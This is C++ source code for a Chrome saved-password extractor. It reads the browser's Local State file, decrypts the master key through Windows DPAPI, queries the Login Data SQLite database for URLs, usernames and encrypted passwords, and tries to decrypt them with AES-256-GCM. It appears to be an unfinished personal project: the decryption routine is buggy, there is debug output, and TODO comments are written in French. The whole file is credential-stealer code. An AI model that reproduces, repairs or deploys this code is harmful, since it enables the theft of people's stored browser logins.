#include <iostream>
#include <windows.h>
#include <dpapi.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <sstream>
#include <wincrypt.h>
#include <sodium.h>
#pragma comment(lib, "Crypt32")

#include "utils/sqlite3.h"
#include "utils/modp_b64.h"
#include "utils/base64.h"

std::string find(std::string str, std::string const &search){
    bool find{false};
    auto it{std::find(str.begin(), str.end(), search.front())};
    while(it != str.end() && !find){
        str.erase(str.begin(), it);
        bool valid{true};
        for(int i=0;i<search.length();i++){
            if(str.length()-1<i || str.at(i) != search.at(i)){
                valid = false;
                break;
            }
        }
        if(valid) return str;
        else it = std::find(str.begin()+1, str.end(), search.front());
    }
    return "";
}

bool Base64Decode(const std::string& input, std::string* output) {
    std::string temp;
    temp.resize(modp_b64_decode_len(input.size()));

    // does not null terminate result since result is binary data!
    size_t input_size = input.size();
    size_t output_size = modp_b64_decode(&(temp[0]), input.data(), input_size);
    if (output_size == MODP_B64_ERROR)
        return false;

    temp.resize(output_size);
    output->swap(temp);
    return true;
}

std::string DecryptRefreshToken(const std::string& cipher_text) {
    DATA_BLOB input;
    input.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(cipher_text.data()));
    input.cbData = static_cast<DWORD>(cipher_text.length());
    DATA_BLOB output;
    BOOL result = ::CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr,
                                       CRYPTPROTECT_UI_FORBIDDEN, &output);

    if (!result)
        return std::string();

    std::string refresh_token(reinterpret_cast<char*>(output.pbData),
                              output.cbData);
    ::LocalFree(output.pbData);
    return refresh_token;
}

void decrypt(const unsigned char *cryptedPassword, std::string &masterKey){
    std::string str{reinterpret_cast<const char*>(cryptedPassword)};
    const std::string iv = str.substr(3, 12);
    const std::string payload{str.substr(15)};
    std::string decrypted{};
    unsigned long long decrypted_len;
    std::cout << "Debug value: " << crypto_aead_aes256gcm_decrypt(
            reinterpret_cast<unsigned char *>(decrypted.data()), &decrypted_len,
            nullptr,
            reinterpret_cast<const unsigned char *>(payload.c_str()), payload.length(),
            reinterpret_cast<const unsigned char *>(iv.c_str()), iv.length(),
            reinterpret_cast<const unsigned char *>(crypto_aead_aes256gcm_NPUBBYTES),
            reinterpret_cast<const unsigned char *>(masterKey.c_str())
    ) << std::endl;

    std::cout << "decrypted: " << decrypted << std::endl;
}

int main() {
    std::cout << std::boolalpha;

    std::ifstream localStateFile{std::getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data\\Local State")};
    std::stringstream localStateStream;
    localStateStream << localStateFile.rdbuf();
    std::string localState{localStateStream.str()};

    std::string test = find(localState, R"("os_crypt":{"encrypted_key":)");
    test.erase(std::find(test.begin(), test.end(), '}'), test.end());
    test.erase(test.begin(), test.begin()+29);
    test.erase(test.end()-1, test.end());
    std::string decoded{};
    Base64Decode(test, &decoded);
    decoded.erase(decoded.begin(), decoded.begin()+5);
    std::string masterKey = DecryptRefreshToken(decoded);
    //std::cout << decoded << std::endl;
    //std::cout << "-------------------" << std::endl;
    //std::cout << decrypted << std::endl;
    //std::cout << "-------------------" << std::endl;
    //std::cout << base64_encode(decrypted) << std::endl;

    sqlite3 *db;
    //TODO verification de l'existence et gestion d'erreur
    std::string loginFilePath{getenv("LOCALAPPDATA") + std::string("/Google/Chrome/User Data/Default/Login Data")};
    std::cout << std::filesystem::exists(loginFilePath) << std::endl;
    //TODO Verification du succès et gestion d'erreur
    if(sqlite3_open(loginFilePath.c_str(), &db)){
        std::cout << "error: " << sqlite3_errmsg(db) << std::endl;
        return 1;
    }

    const char *req = "SELECT action_url, username_value, password_value FROM logins";
    sqlite3_stmt *pStmt;

    sqlite3_prepare(db, req, -1, &pStmt, 0);

    while(sqlite3_step(pStmt) == SQLITE_ROW){
        std::cout << "Url: " << sqlite3_column_text(pStmt, 0) << std::endl;
        std::cout << "Login: " << (char *)sqlite3_column_text(pStmt, 1) << std::endl;

        const unsigned char *cryptedPassword{sqlite3_column_text(pStmt, 2)};

        //TODO check crypto_aead_aes256gcm_is_available
        decrypt(cryptedPassword, masterKey);

        std::cout << "Password: " << cryptedPassword << std::endl;
        return 0;
    }

    sqlite3_finalize(pStmt);
    sqlite3_close(db);

    return 0;
}
